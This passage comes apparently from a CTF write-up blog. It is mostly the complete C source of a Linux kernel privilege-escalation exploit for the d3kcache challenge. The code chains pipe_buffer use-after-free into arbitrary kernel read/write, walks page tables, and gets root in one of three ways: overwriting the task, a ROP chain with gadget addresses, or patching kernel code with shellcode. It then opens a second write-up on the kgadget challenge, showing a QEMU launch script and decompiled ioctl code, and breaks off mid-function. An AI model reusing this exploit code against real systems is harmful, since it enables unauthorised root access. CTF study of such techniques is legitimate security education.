Done.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    get_root_shell();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_OFFSET 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMD_OFFSET 21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUD_OFFSET 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGD_OFFSET 39</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_ENTRY_MASK 0b111111111UL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_ATTR_RW (1UL &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_ATTR_NX (1UL &lt;&lt; 63)</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pgd_addr, mm_struct_addr, *mm_struct_buf;</span><br><span class="line"><span class="type">size_t</span> stack_addr, stack_addr_another;</span><br><span class="line"><span class="type">size_t</span> stack_page, mm_struct_page;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">vaddr_resolve</span><span class="params">(<span class="type">size_t</span> pgd_addr, <span class="type">size_t</span> vaddr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> pud_addr, pmd_addr, pte_addr, pte_val;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">    pte_val = (buf[PTE_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pte_val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">vaddr_resolve_for_3_level</span><span class="params">(<span class="type">size_t</span> pgd_addr, <span class="type">size_t</span> vaddr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> pud_addr, pmd_addr;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">    <span class="keyword">return</span> (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vaddr_remapping</span><span class="params">(<span class="type">size_t</span> pgd_addr, <span class="type">size_t</span> vaddr, <span class="type">size_t</span> paddr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> pud_addr, pmd_addr, pte_addr;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">    buf[PTE_ENTRY(vaddr)] = paddr | <span class="number">0x8000000000000867</span>; <span class="comment">/* mark it writable */</span></span><br><span class="line">    arbitrary_write_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf,</span><br><span class="line">                            <span class="number">0xff0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pgd_vaddr_resolve</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading current task_struct...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read current task_struct */</span></span><br><span class="line">    current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf);</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (current_task_page+<span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">    stack_addr = tsk_buf[<span class="number">4</span>];</span><br><span class="line">    mm_struct_addr = tsk_buf[<span class="number">292</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>,stack_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>,mm_struct_addr);</span><br><span class="line"></span><br><span class="line">    mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>,mm_struct_page);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read mm_struct */</span></span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) mm_struct_page, buf);</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (mm_struct_page+<span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    mm_struct_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (mm_struct_addr &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* only this is a virtual addr, others in page table are all physical addr*/</span></span><br><span class="line">    pgd_addr = mm_struct_buf[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span></span><br><span class="line">           <span class="string">&quot;0x%lx\n\n&quot;</span>, pgd_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * It may also be okay to write ROP chain on pipe_write&#x27;s stack, if there&#x27;s</span></span><br><span class="line"><span class="comment"> * no CONFIG_RANDOMIZE_KSTACK_OFFSET_DEFAULT(it can also be bypass by RETs). </span></span><br><span class="line"><span class="comment"> * But what I want is a more novel and general exploitation that </span></span><br><span class="line"><span class="comment"> * doesn&#x27;t need any information about the kernel image. </span></span><br><span class="line"><span class="comment"> * So just simply overwrite the task_struct is good :)</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * If you still want a normal ROP, refer to following codes.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff811284e0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff82201a90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff83079ee8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810157a9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RET 0xffffffff810157aa</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_rop</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>], idx = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* resolving some vaddr */</span></span><br><span class="line">    pgd_vaddr_resolve();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* reading the page table directly to get physical addr of kernel stack*/</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading page table...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_addr_another = vaddr_resolve(pgd_addr, stack_addr);</span><br><span class="line">    stack_addr_another &amp;= (~PAGE_ATTR_NX); <span class="comment">/* N/X bit */</span></span><br><span class="line">    stack_addr_another += page_offset_base;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span></span><br><span class="line">           <span class="string">&quot;0x%lx\n\n&quot;</span>, stack_addr_another);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct the ROP */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ((<span class="number">0x1000</span> - <span class="number">0x100</span>) / <span class="number">8</span>); i++) &#123;</span><br><span class="line">        rop[idx++] = RET + kernel_offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rop[idx++] = POP_RDI_RET + kernel_offset;</span><br><span class="line">    rop[idx++] = INIT_CRED + kernel_offset;</span><br><span class="line">    rop[idx++] = COMMIT_CREDS + kernel_offset;</span><br><span class="line">    rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE +<span class="number">54</span> + kernel_offset;</span><br><span class="line">    rop[idx++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop[idx++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop[idx++] = (<span class="type">size_t</span>) get_root_shell;</span><br><span class="line">    rop[idx++] = user_cs;</span><br><span class="line">    rop[idx++] = user_rflags;</span><br><span class="line">    rop[idx++] = user_sp;</span><br><span class="line">    rop[idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    stack_page = direct_map_addr_to_page_addr(stack_addr_another);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) (stack_page + <span class="number">0x40</span> * <span class="number">3</span>), rop, <span class="number">0xff0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_usma</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> NS_CAPABLE_SETID 0xffffffff810fd2a0</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *kcode_map, *kcode_func;</span><br><span class="line">    <span class="type">size_t</span> dst_paddr, dst_vaddr, *rop, idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* resolving some vaddr */</span></span><br><span class="line">    pgd_vaddr_resolve();</span><br><span class="line"></span><br><span class="line">    kcode_map = mmap((<span class="type">void</span>*) <span class="number">0x114514000</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, </span><br><span class="line">                     MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!kcode_map) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to create mmap area!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* because of lazy allocation, we need to write it manually */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        kcode_map[i] = <span class="string">&quot;arttnba3&quot;</span>[i];</span><br><span class="line">        kcode_map[i + <span class="number">0x1000</span>] = <span class="string">&quot;arttnba3&quot;</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite kernel code seg to exec shellcode directly :) */</span></span><br><span class="line">    dst_vaddr = NS_CAPABLE_SETID + kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">           dst_vaddr);</span><br><span class="line"></span><br><span class="line">    dst_paddr = vaddr_resolve_for_3_level(pgd_addr, dst_vaddr);</span><br><span class="line">    dst_paddr += <span class="number">0x1000</span> * PTE_ENTRY(dst_vaddr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span></span><br><span class="line">           <span class="string">&quot;0x%lx\n\n&quot;</span>, dst_paddr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* remapping to our mmap area */</span></span><br><span class="line">    vaddr_remapping(pgd_addr, <span class="number">0x114514000</span>, dst_paddr);</span><br><span class="line">    vaddr_remapping(pgd_addr, <span class="number">0x114514000</span> + <span class="number">0x1000</span>, dst_paddr + <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite kernel code segment directly */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Start overwriting kernel code segment...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The setresuid() check for user&#x27;s permission by ns_capable_setid(),</span></span><br><span class="line"><span class="comment">     * so we can just patch it to let it always return true :)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">memset</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>), <span class="string">&#x27;\x90&#x27;</span>, <span class="number">0x40</span>); <span class="comment">/* nop */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>) + <span class="number">0x40</span>, </span><br><span class="line">            <span class="string">&quot;\xf3\x0f\x1e\xfa&quot;</span>  <span class="comment">/* endbr64 */</span></span><br><span class="line">            <span class="string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span>  <span class="comment">/* mov rax, 1 */</span></span><br><span class="line">            <span class="string">&quot;\xc3&quot;</span>, <span class="comment">/* ret */</span></span><br><span class="line">            <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* get root now :) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    get_root_shell();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Just for testing CFI&#x27;s availability :)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigger_control_flow_integrity_detection</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pbuf</span> =</span> (<span class="type">void</span>*) ((<span class="type">size_t</span>)buf + TRD_PIPE_BUF_SZ);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>, *<span class="title">ops_addr</span>;</span></span><br><span class="line"></span><br><span class="line">    ops_addr = (<span class="keyword">struct</span> pipe_buf_operations*) </span><br><span class="line">                 (((<span class="type">size_t</span>) info_pipe_buf.page - vmemmap_base) / <span class="number">0x40</span> * <span class="number">0x1000</span>);</span><br><span class="line">    ops_addr = (<span class="keyword">struct</span> pipe_buf_operations*)((<span class="type">size_t</span>)ops_addr+page_offset_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* two random gadget :) */</span></span><br><span class="line">    ops = (<span class="keyword">struct</span> pipe_buf_operations*) buf;</span><br><span class="line">    ops-&gt;confirm = (<span class="type">void</span>*)(<span class="number">0xffffffff81a78568</span> + kernel_offset);</span><br><span class="line">    ops-&gt;release = (<span class="type">void</span>*)(<span class="number">0xffffffff816196e6</span> + kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        pbuf-&gt;ops = ops_addr;</span><br><span class="line">        pbuf = (<span class="keyword">struct</span> pipe_buffer *)((<span class="type">size_t</span>) pbuf + TRD_PIPE_BUF_SZ);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    evil_2nd_buf.page = info_pipe_buf.page;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>],&amp;evil_4th_buf,<span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>],&amp;evil_2nd_buf,<span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">          temp_zero_buf, </span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>],&amp;evil_3rd_buf,<span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* write data into dst page */</span></span><br><span class="line">    write(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>], buf, <span class="number">0xf00</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* trigger CFI... */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[=] triggering CFI&#x27;s detection...\n&quot;</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    close(pipe_fd[self_2nd_pipe_pid][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Step.O - fundamental works</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* bind core to 0 */</span></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* dev file */</span></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/d3kcache&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to open /dev/d3kcache!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray pgv pages */</span></span><br><span class="line">    prepare_pgv_system();</span><br><span class="line">    prepare_pgv_pages();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Step.I - page-level heap fengshui to make a cross-cache off-by-null,</span></span><br><span class="line"><span class="comment">     * making two pipe_buffer pointing to the same pages</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    corrupting_first_level_pipe_for_page_uaf();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Step.II - re-allocate the victim page to pipe_buffer,</span></span><br><span class="line"><span class="comment">     * leak page-related address and construct a second-level pipe uaf</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    corrupting_second_level_pipe_for_pipe_uaf();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Step.III - re-allocate the second-level victim page to pipe_buffer,</span></span><br><span class="line"><span class="comment">     * construct three self-page-pointing pipe_buffer </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    building_self_writing_pipe();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Step.IV - leaking fundamental information by pipe</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    info_leaking_by_arbitrary_pipe();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Step.V - different method of exploitation</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>] &amp;&amp; !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;rop&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">/* traditionally root by rop */</span></span><br><span class="line">        privilege_escalation_by_rop();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (argv[<span class="number">1</span>] &amp;&amp; !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;cfi&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">/* extra - check for CFI&#x27;s availability */</span></span><br><span class="line">        trigger_control_flow_integrity_detection();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (argv[<span class="number">1</span>] &amp;&amp; !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;usma&quot;</span>)) &#123;</span><br><span class="line">        privilege_escalation_by_usma();</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* default: root by seeking init_task and overwrite current */</span></span><br><span class="line">        privilege_escalation_by_task_overwrite();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* we SHOULDN&#x27;T get there, so panic :( */</span></span><br><span class="line">    trigger_control_flow_integrity_detection();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="miniLCTF-2022-kgadget"><a href="#miniLCTF-2022-kgadget" class="headerlink" title="miniLCTF_2022-kgadget"></a>miniLCTF_2022-kgadget</h1><p>启动脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M \</span><br><span class="line">-cpu kvm64,+smep,+smap \</span><br><span class="line">-smp cores=2,threads=2 \</span><br><span class="line">-kernel bzImage \</span><br><span class="line">-initrd ./rootfs.cpio.gz \</span><br><span class="line">-nographic \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-snapshot \</span><br><span class="line">-append <span class="string">&quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot;</span> \</span><br><span class="line">-no-reboot \</span><br><span class="line">-s</span><br></pre></td></tr></table></figure><p>可以发现关闭了kaslr,那么许多利用就十分方便了</p><p>分析一下模块,发现最主要的就是注册了ioctl</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">kgadget_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (__fastcall **v2)(<span class="type">void</span> *, _QWORD); <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">void</span> (__fastcall *v3)(<span class="type">void</span> *, _QWORD); <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> (__fastcall *v4)(<span class="type">void</span> *, _QWORD); <span class="comment">// rsi</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">114514</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *v2;</span><br><span class="line">    v4 = *v2;</span><br><span class="line">    printk(&amp;unk_370);</span><br><span class="line">    printk(&amp;unk_3A0);</span><br><span class="line"> 